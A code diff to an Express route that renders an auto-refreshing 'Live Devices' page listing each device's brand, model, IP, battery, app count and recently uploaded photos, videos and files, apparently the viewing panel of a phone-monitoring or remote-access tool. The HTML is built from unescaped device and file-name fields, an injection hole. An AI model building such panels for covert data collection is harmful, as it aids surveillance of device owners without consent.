@@ -156,26 +156,25 @@ res.status(500).send("error");
 
 app.get('/users', (req, res) => {
 
-const logs = loadLogs();
+  const logs = loadLogs();
 
-const devices = logs.filter(x => x.type === "device");
-const files = logs.filter(x => x.type === "file");
+  const devices = logs.filter(x => x.type === "device");
+  const files = logs.filter(x => x.type === "file");
 
-const grouped = {};
+  const grouped = {};
 
-devices.forEach(d => {
-const id = d.device_id;
-if (!grouped[id]) grouped[id] = { info: d, files: [] };
-});
+  devices.forEach(d => {
+    const id = d.device_id;
+    if (!grouped[id]) grouped[id] = { info: d, files: [] };
+  });
 
-files.forEach(f => {
-const id = f.device_id;
-if (!grouped[id]) return;
-grouped[id].files.push(f);
-});
+  files.forEach(f => {
+    const id = f.device_id;
+    if (!grouped[id]) return;
+    grouped[id].files.push(f);
+  });
 
-let html = `
-
+  let html = `
   <html>
   <head>
     <meta http-equiv="refresh" content="5">
@@ -189,46 +188,40 @@ let html = `
   <h1>🔥 Live Devices</h1>
   `;
 
-Object.values(grouped).reverse().forEach(g => {
+  Object.values(grouped).reverse().forEach(g => {
 
-```
-const u = g.info;
+    const u = g.info;
 
-html += `
-<div class="box">
-  <h2>Device</h2>
-</div>
-`;
-  <h2>📱 ${u.brand} ${u.model}</h2>
-  IP: ${u.ip}<br>
-  Battery: ${u.battery}%<br>
-  Apps: ${u.app_count}<br>
+    html += `
+    <div class="box">
+      <h2>📱 ${u.brand} ${u.model}</h2>
+      IP: ${u.ip}<br>
+      Battery: ${u.battery}%<br>
+      Apps: ${u.app_count}<br>
 
-  <h3>📂 Files (${g.files.length})</h3>
-`;
+      <h3>📂 Files (${g.files.length})</h3>
+    `;
 
-g.files.slice(-10).reverse().forEach(f => {
+    g.files.slice(-10).reverse().forEach(f => {
 
-  const url = "/uploads/" + f.file;
+      const url = "/uploads/" + f.file;
 
-  if (f.file.endsWith(".jpg") || f.file.endsWith(".png")) {
-    html += `<img src="${url}">`;
-  } else if (f.file.endsWith(".mp4")) {
-    html += `<video controls src="${url}"></video>`;
-  } else {
-    html += `<div>📄 ${f.original}</div>`;
-  }
+      if (f.file.endsWith(".jpg") || f.file.endsWith(".png")) {
+        html += `<img src="${url}">`;
+      } else if (f.file.endsWith(".mp4")) {
+        html += `<video controls src="${url}"></video>`;
+      } else {
+        html += `<div>📄 ${f.original}</div>`;
+      }
 
-});
+    });
 
-html += `</div>`;
-```
+    html += `</div>`;
+  });
 
-});
+  html += "</body></html>";
 
-html += "</body></html>";
-
-res.send(html);
+  res.send(html);
 });
 
 /* ================= STATIC ================= */
